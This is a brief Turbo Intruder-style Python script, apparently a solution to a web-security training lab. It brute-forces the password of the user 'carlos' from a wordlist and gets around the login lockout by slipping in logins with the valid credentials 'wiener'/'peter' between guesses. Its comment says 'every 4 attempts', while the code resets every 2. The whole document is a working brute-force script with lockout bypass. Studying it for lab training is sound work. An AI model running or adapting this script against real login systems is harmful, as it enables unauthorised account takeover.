def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.THREADED
                           )

    passwords = [word.rstrip() for word in open('/usr/wordlist')]

    for i, password in enumerate(passwords):
        # Try the password against carlos
        engine.queue(target.req, ['carlos', password])

        # Every 4 attempts, reset the lockout by logging in with correct creds
        if (i + 1) % 2 == 0:
            engine.queue(target.req, ['wiener', 'peter'])

def handleResponse(req, interesting):
    table.add(req)
